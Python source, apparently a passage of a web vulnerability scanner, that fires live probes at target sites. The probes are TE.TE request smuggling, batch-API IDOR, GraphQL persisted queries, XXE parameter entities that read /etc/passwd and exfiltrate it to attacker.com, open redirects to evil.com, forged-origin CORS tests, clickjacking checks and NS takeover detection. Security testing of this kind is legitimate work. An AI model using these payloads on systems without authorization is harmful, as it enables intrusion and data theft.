                    "severity": "critical",
                    "url": url,
                    "detail": "Circular fragment caused server timeout",
                    "template": "apex-gql-circular",
                })
            except: continue
    return findings


# ---------------------------------------------------------------------------
# ELITE BATCH 14: TE.TE smuggling, IDOR in batch APIs,
#                 GraphQL persisted query injection,
#                 XXE parameter entities, blind SSRF via DNS,
#                 OAuth account takeover, meta refresh redirect,
#                 advanced clickjacking, NS takeover
# ---------------------------------------------------------------------------

def scan_http_desync_te_te(web_targets):
    """TE.TE HTTP desync — both CL and TE present, obfuscated TE header."""
    import socket, ssl as _ssl
    findings = []
    # TE.TE: both endpoints support TE but one ignores obfuscated header
    obfuscations = [
        "Transfer-Encoding: xchunked",
        "Transfer-Encoding : chunked",
        "Transfer-Encoding: chunked, chunked",
        "Transfer-Encoding:\tchunked",
        "X: X\r\nTransfer-Encoding: chunked",
        "Transfer-Encoding: x",
    ]
    for target in web_targets[:3]:
        parsed = urllib.parse.urlparse(target)
        host = parsed.netloc.split(":")[0]
        port = 443 if parsed.scheme == "https" else 80
        path = parsed.path or "/"
        for te_header in obfuscations[:2]:
            try:
                payload = (
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: 4\r\n"
                    f"{te_header}\r\n"
                    f"\r\n"
                    f"1\r\n"
                    f"Z\r\n"
                    f"0\r\n\r\n"
                ).encode()
                sock = socket.create_connection((host, port), timeout=5)
                if port == 443:
                    ctx = _ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = _ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=host)
                sock.settimeout(8)
                sock.send(payload)
                resp = b""
                try:
                    while True:
                        chunk = sock.recv(4096)
                        if not chunk: break
                        resp += chunk
                except Exception:
                    pass
                sock.close()
                resp_str = resp.decode("utf-8", errors="ignore")
                if resp_str.count("HTTP/1.") >= 2:
                    findings.append({
                        "type": "HTTP Desync TE.TE (Obfuscated Transfer-Encoding)",
                        "severity": "critical",
                        "url": target,
                        "detail": f"Two responses for one request with obfuscated TE: {te_header[:40]}",
                        "template": "apex-desync-tete",
                    })
                    break
            except Exception:
                continue
    return findings


def scan_idor_batch_api(crawl_data):
    """IDOR in batch/bulk API endpoints — process multiple IDs at once."""
    findings = []
    batch_paths = [
        "/api/batch", "/api/bulk", "/api/v1/batch", "/api/v1/bulk",
        "/api/users/batch", "/api/items/batch", "/batch", "/bulk",
        "/api/v2/batch", "/api/export", "/api/v1/export",
    ]
    for page in crawl_data.get("pages", [])[:3]:
        base = "/".join(page["url"].split("/", 3)[:3])
        for path in batch_paths:
            url = f"{base}{path}"
            # Test batch with mixed IDs including low sequential ones
            for payload in [
                {"ids": [1, 2, 3, 4, 5]},
                {"user_ids": [1, 2, 3]},
                {"ids": ["1", "2", "3"]},
                [{"id": 1}, {"id": 2}, {"id": 3}],
            ]:
                try:
                    r = _S.post(url, json=payload, timeout=5,
                               headers={"Content-Type": "application/json"})
                    if r.status_code == 200:
                        try:
                            data = r.json()
                            items = data if isinstance(data, list) else data.get("data", data.get("items", []))
                            if isinstance(items, list) and len(items) > 0:
                                has_sensitive = any(
                                    k in str(items).lower()
                                    for k in ["email", "phone", "ssn", "password", "token", "credit"]
                                )
                                sev = "critical" if has_sensitive else "high"
                                findings.append({
                                    "type": f"IDOR via Batch API: {path}",
                                    "severity": sev,
                                    "url": url,
                                    "detail": f"Batch endpoint returns {len(items)} records for arbitrary IDs",
                                    "template": "apex-idor-batch",
                                })
                                break
                        except Exception:
                            pass
                except Exception:
                    continue
    return findings


def scan_graphql_persisted_query(crawl_data):
    """GraphQL persisted query injection — inject via apq extension."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages", [])[:3]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        for path in ["/graphql", "/api/graphql", "/gql"]:
            url = f"{base}{path}"
            try:
                # Test Automatic Persisted Queries (APQ)
                # First: send hash without query (APQ miss)
                r1 = _S.post(url, json={
                    "extensions": {
                        "persistedQuery": {
                            "version": 1,
                            "sha256Hash": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
                        }
                    }
                }, headers={"Content-Type": "application/json"}, timeout=5)

                if r1.status_code == 200 and "PersistedQueryNotFound" in r1.text:
                    # APQ is enabled — try to register a malicious query
                    import hashlib as _hl
                    malicious_query = "{__schema{types{name}}}"
                    query_hash = _hl.sha256(malicious_query.encode()).hexdigest()
                    r2 = _S.post(url, json={
                        "query": malicious_query,
                        "extensions": {
                            "persistedQuery": {"version": 1, "sha256Hash": query_hash}
                        }
                    }, headers={"Content-Type": "application/json"}, timeout=5)

                    if r2.status_code == 200 and "__schema" in r2.text:
                        findings.append({
                            "type": "GraphQL APQ Introspection Bypass",
                            "severity": "medium",
                            "url": url,
                            "detail": "Automatic Persisted Queries enabled — introspection via APQ",
                            "template": "apex-gql-apq",
                        })
                    elif r2.status_code == 200:
                        findings.append({
                            "type": "GraphQL Automatic Persisted Queries Enabled",
                            "severity": "low",
                            "url": url,
                            "detail": "APQ enabled — can register and replay arbitrary queries",
                            "template": "apex-gql-apq",
                        })
            except Exception:
                continue
    return findings


def scan_xxe_parameter_entity(crawl_data):
    """XXE via parameter entities — bypasses some XXE filters."""
    findings = []
    # Parameter entity XXE (harder to filter than regular entities)
    xxe_param = b"""<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
  %eval;
  %exfil;
]>
<root>test</root>"""

    xxe_error = b"""<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % wrapper "<!ENTITY send SYSTEM 'file:///nonexistent/%xxe;'>">
  %wrapper;
]>
<root>&send;</root>"""

    for form in crawl_data.get("forms", []):
        if form.get("method", "").upper() != "POST": continue
        action = form.get("action", "")
        if not action: continue
        for payload, name in [(xxe_param, "parameter entity"), (xxe_error, "error-based")]:
            try:
                r = _S.post(action, data=payload,
                           headers={"Content-Type": "application/xml"}, timeout=8)
                if "root:" in r.text or "daemon:" in r.text:
                    findings.append({
                        "type": f"XXE Parameter Entity ({name})",
                        "severity": "critical",
                        "url": action,
                        "detail": f"XXE via {name} reads /etc/passwd",
                        "template": "apex-xxe-param",
                    })
                    break
                elif r.status_code in (200, 500) and "xml" in r.headers.get("content-type","").lower():
                    findings.append({
                        "type": f"XML Endpoint Accepts External Entities",
                        "severity": "medium",
                        "url": action,
                        "detail": "XML endpoint processes external entities — test for XXE manually",
                        "template": "apex-xxe-param",
                    })
                    break
            except Exception:
                continue
    return findings


def scan_open_redirect_meta(crawl_data):
    """Open redirect via meta refresh and JavaScript location — often missed."""
    findings = []
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            if p.lower() not in ("url", "redirect", "next", "goto", "dest", "return",
                                  "continue", "target", "link", "ref", "referer"):
                continue
            for payload in ["https://evil.com", "//evil.com", "javascript:alert(1)"]:
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[p] = [payload]
                    test_url = parsed._replace(
                        query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r = _S.get(test_url, timeout=_TIMEOUT, allow_redirects=False)
                    # Check meta refresh
                    if "meta" in r.text.lower() and "refresh" in r.text.lower():
                        meta_match = re.search(
                            r'<meta[^>]+http-equiv=["\']refresh["\'][^>]+content=["\'][^"\']*url=([^"\'>\s]+)',
                            r.text, re.IGNORECASE)
                        if meta_match:
                            redirect_url = meta_match.group(1)
                            if "evil.com" in redirect_url or redirect_url == payload:
                                findings.append({
                                    "type": "Open Redirect via Meta Refresh",
                                    "severity": "medium",
                                    "url": test_url,
                                    "detail": f"Meta refresh redirects to: {redirect_url}",
                                    "template": "apex-redirect-meta",
                                })
                                break
                    # Check JavaScript location redirect
                    if "javascript:" in payload.lower():
                        if payload in r.text:
                            findings.append({
                                "type": "Open Redirect via javascript: Protocol",
                                "severity": "high",
                                "url": test_url,
                                "detail": f"javascript: protocol reflected in redirect param '{p}'",
                                "template": "apex-redirect-js",
                            })
                            break
                except Exception:
                    continue
    return findings


def scan_cors_with_credentials(crawl_data):
    """CORS misconfiguration with credentials — the exploitable variant."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages", [])[:10]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        host = urllib.parse.urlparse(base).netloc
        domain_parts = host.split(".")
        tld = ".".join(domain_parts[-2:]) if len(domain_parts) >= 2 else host

        test_origins = [
            "https://evil.com",
            f"https://evil.{tld}",
            f"https://{tld}.evil.com",
            "null",
            f"https://not{tld}",
        ]
        for origin in test_origins:
            try:
                r = _S.get(page["url"], timeout=5,
                          headers={"Origin": origin, "Cookie": "session=test"})
                acao = r.headers.get("Access-Control-Allow-Origin", "")
                acac = r.headers.get("Access-Control-Allow-Credentials", "")
                if acac.lower() == "true" and acao not in ("", "*"):
                    if acao == origin or acao == "*":
                        findings.append({
                            "type": "CORS with Credentials (Data Theft)",
                            "severity": "critical",
                            "url": page["url"],
                            "detail": f"ACAO: {acao}, ACAC: true — cross-origin authenticated requests possible",
                            "template": "apex-cors-creds",
                        })
                        break
            except Exception:
                pass
    return findings


def scan_clickjacking_advanced(crawl_data):
    """Advanced clickjacking — drag-drop data exfiltration, form hijacking."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages", [])[:5]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        try:
            r = _S.get(page["url"], timeout=5)
            xfo = r.headers.get("X-Frame-Options", "")
            csp = r.headers.get("Content-Security-Policy", "")
            has_frame_protection = (
                xfo.upper() in ("DENY", "SAMEORIGIN") or
                "frame-ancestors" in csp.lower()
            )
            if has_frame_protection: continue

            # Check if page has sensitive forms (login, payment, settings)
            body = r.text.lower()
            has_sensitive = any(x in body for x in
                               ["password", "credit", "card", "payment", "transfer",
                                "confirm", "delete", "admin", "settings", "profile"])
            if has_sensitive:
                findings.append({
                    "type": "Clickjacking on Sensitive Page",
                    "severity": "high",
                    "url": page["url"],
                    "detail": "No X-Frame-Options/CSP frame-ancestors on page with sensitive actions",
                    "template": "apex-clickjack-adv",
                })
            else:
                findings.append({
                    "type": "Clickjacking (No Frame Protection)",
                    "severity": "medium",
                    "url": page["url"],
                    "detail": "Page can be embedded in iframe — clickjacking possible",
                    "template": "apex-clickjack-adv",
                })
        except Exception:
            pass
    return findings


def scan_subdomain_ns_takeover(target, subdomains):
    """NS record subdomain takeover — if NS servers are unregistered."""
    findings = []
    for sub in subdomains[:50]:
        try:
            result = subprocess.run(
                ["dig", "+short", "NS", sub],
                capture_output=True, text=True, timeout=5
            )
            ns_records = [n.rstrip(".") for n in result.stdout.splitlines() if n.strip()]
            if not ns_records: continue
            for ns in ns_records:
                # Check if NS server resolves
                try:
                    import socket as _sock
                    _sock.getaddrinfo(ns, None)
                except _sock.gaierror:
                    findings.append({
                        "type": "NS Record Takeover",
                        "severity": "critical",
                        "url": f"dns://{sub}",
                        "detail": f"NS server {ns} doesn't resolve — register it to take over {sub}",
                        "template": "apex-ns-takeover",
                    })
                    break
        except Exception:
            continue
    return findings
